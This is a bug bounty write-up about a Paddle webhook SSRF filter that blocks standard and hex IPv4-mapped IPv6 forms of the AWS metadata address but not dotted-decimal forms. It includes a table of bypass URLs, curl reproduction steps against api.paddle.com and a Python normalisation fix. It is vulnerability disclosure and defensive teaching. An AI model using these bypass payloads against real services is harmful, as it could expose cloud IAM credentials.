# W-001 — SSRF Filter Incomplete Fix: IPv4-Mapped IPv6 Bypass (Paddle)

**Program:** Paddle.com Public Bug Bounty (YesWeHack)  
**Asset:** `api.paddle.com` (High value)  
**Severity:** Medium — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` = **5.3**  
**CWE:** CWE-918 (SSRF) / CWE-184 (Incomplete Blocklist)  
**Testing date:** 2026-05-17

---

## TL;DR

Paddle's notification webhook system had an SSRF filter that blocked the IPv4 link-local address `169.254.169.254` (AWS IMDS) and even its hex-encoded IPv6-mapped form `[::ffff:a9fe:a9fe]`. But the filter had a blind spot: the dotted-decimal variant `[::ffff:169.254.169.254]` bypassed it completely. Instead of HTTP 407 ("Request blocked"), the server returned HTTP 503 — meaning it sent the request, and a secondary network control (not the application filter) stopped it.

---

## Discovery Process

### 1. Feature reconnaissance

Paddle vendors can configure webhook destinations via `PATCH /notification-settings/{id}`. I was reviewing what URL formats the destination field would accept and whether any server-side request was made to the supplied URL.

By checking the notification logs (`GET /notifications/{id}/logs`) I could see the actual HTTP response code the Paddle backend got when it hit the destination — a full-read SSRF oracle.

### 2. Standard SSRF probe

I set the destination to `http://169.254.169.254/latest/meta-data/` and triggered a webhook. The log showed `response_code: 407, response_body: "Request blocked/denied"`. The filter was active.

### 3. Testing known IPv6 encoding variants

Knowing that link-local `169.254.169.254` is equivalent to `[::ffff:a9fe:a9fe]` in IPv4-mapped IPv6 notation, I tried that form. Also blocked with HTTP 407. So the filter was explicitly aware of IPv6-mapped addresses — at least in hex form.

### 4. Spotting the blind spot

RFC 4291 defines three syntactic representations of IPv4-mapped IPv6 addresses:
- Hex: `::ffff:a9fe:a9fe`
- Dotted-decimal: `::ffff:169.254.169.254`
- Expanded: `0:0:0:0:0:ffff:169.254.169.254`

All three are canonically equivalent. I tried the dotted-decimal form `[::ffff:169.254.169.254]`. The response was `503` with an empty body — not 407. The filter was not triggered.

---

## Vulnerability

The filter normalized hex-encoded IPv6-mapped addresses correctly, but did not apply the same normalization to the dotted-decimal form before running it against the blocklist.

| Destination URL | Response | Filter Applied? |
|----------------|----------|-----------------|
| `http://169.254.169.254/latest/meta-data/` | **407** "Request blocked/denied" | Blocked |
| `http://[::ffff:a9fe:a9fe]/latest/meta-data/` | **407** "Request blocked/denied" | Blocked |
| `http://[::FfFf:a9FE:A9Fe]/latest/meta-data/` | **407** "Request blocked/denied" | Blocked |
| `http://[::ffff:169.254.169.254]/latest/meta-data/` | **503** | **BYPASSED** |
| `http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/` | **503** | **BYPASSED** |
| `http://[::FFFF:169.254.169.254]/latest/meta-data/` | **503** | **BYPASSED** |

The 407 vs 503 differential is the PoC: the filter is intentional, it simply has a blind spot for this representation.

---

## Steps to Reproduce

> Requires a Paddle vendor account. All steps use the vendor's own notification settings.

**Step 1 — Verify the filter blocks the standard form (control)**

```bash
# Set destination to standard IPv4 IMDS address
curl -s -X PATCH "https://api.paddle.com/notification-settings/[NTFSET_ID]" \
  -H "Cookie: [VENDOR_SESSION]" \
  -H "Content-Type: application/json" \
  -H "User-Agent: curl/8.x BugBounty" \
  -d '{"destination":"http://169.254.169.254/latest/meta-data/"}'

# Trigger a notification (any billable event)
curl -s -X POST "https://api.paddle.com/customers" \
  -H "Cookie: [VENDOR_SESSION]" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","name":"Control"}'

# Check logs
curl -s "https://api.paddle.com/notifications/[NTF_ID]/logs" \
  -H "Cookie: [VENDOR_SESSION]"
# → response_code: 407, response_body: "Request blocked/denied"
```

**Step 2 — Confirm hex-encoded IPv6-mapped is also blocked**

```bash
curl -s -X PATCH "https://api.paddle.com/notification-settings/[NTFSET_ID]" \
  -H "Cookie: [VENDOR_SESSION]" \
  -H "Content-Type: application/json" \
  -d '{"destination":"http://[::ffff:a9fe:a9fe]/latest/meta-data/"}'
# → response_code: 407 (blocked)
```

**Step 3 — Bypass using dotted-decimal IPv4-mapped IPv6**

```bash
curl -s -X PATCH "https://api.paddle.com/notification-settings/[NTFSET_ID]" \
  -H "Cookie: [VENDOR_SESSION]" \
  -H "Content-Type: application/json" \
  -d '{"destination":"http://[::ffff:169.254.169.254]/latest/meta-data/"}'

# Trigger notification as before, then check logs:
# → response_code: 503, response_body: ""
# HTTP 503 (not 407) confirms the filter was NOT applied.
```

---

## Impact

Any authenticated Paddle vendor can set a webhook destination to `http://[::ffff:169.254.169.254]/latest/meta-data/`, trigger any billable event, and the delivery system will attempt to reach AWS IMDS — bypassing the application-layer filter.

In this case, a secondary network control (NACL/Security Group) stopped the request, hence 503. But that is defense-in-depth, not the primary fix. If that layer is misconfigured on any instance, the IMDS response (including IAM role credentials under IMDSv1) would appear in the notification logs.

**CVSS rationale:**
- `C:L` (not C:H): no credentials were extracted; a secondary network control prevented the full read. C:H requires demonstrated exfiltration.
- `S:C`: the delivery request exits the application toward cloud-internal infrastructure.
- `PR:L`: requires a vendor account (freely registerable).

---

## Remediation

Normalize IPv4-mapped IPv6 addresses to their IPv4 equivalent before blocklist validation. Python's `ipaddress` module handles all three representations transparently:

```python
from ipaddress import ip_address, AddressValueError

def is_blocked(host: str) -> bool:
    try:
        addr = ip_address(host.strip("[]"))
        if addr.ipv4_mapped:
            addr = addr.ipv4_mapped  # collapses hex, dotted-decimal, expanded — all forms
        return addr.is_private or addr.is_link_local or addr.is_loopback
    except AddressValueError:
        return False
```

`ip_address("::ffff:169.254.169.254").ipv4_mapped` returns `IPv4Address('169.254.169.254')` regardless of which representation was used.

---

## Lessons Learned

- **SSRF filter completeness:** Blocking one encoding of an address is not enough. Filters must normalize addresses before validation, not pattern-match on string representations.
- **The oracle matters:** Paddle's notification logs returning the actual response code (`response_code: 407` vs `503`) turned a blind SSRF into a full-read oracle. Always look for delivery logs when testing webhook SSRFs.
- **Differential is the PoC:** The gap between 407 (filter active) and 503 (filter bypassed) was the entire proof. You don't need to extract credentials to demonstrate a bypass.
- **Real CVE precedent:** GHSA-vrcj-hv2q-c58m (Twenty CMS), CVE-2026-42345 (FastGPT), CVE-2026-31943 (LibreChat) — all use the identical `[::ffff:169.254.169.254]` payload and all retrieved actual IAM credentials in environments without a secondary network control.

---

## References

- [RFC 4291 §2.5.5.2 — IPv4-Mapped IPv6 Addresses](https://www.rfc-editor.org/rfc/rfc4291#section-2.5.5.2)
- GHSA-vrcj-hv2q-c58m — Twenty CMS SSRF via identical dotted-decimal bypass
- Python `ipaddress.ip_address.ipv4_mapped` — correct normalization implementation
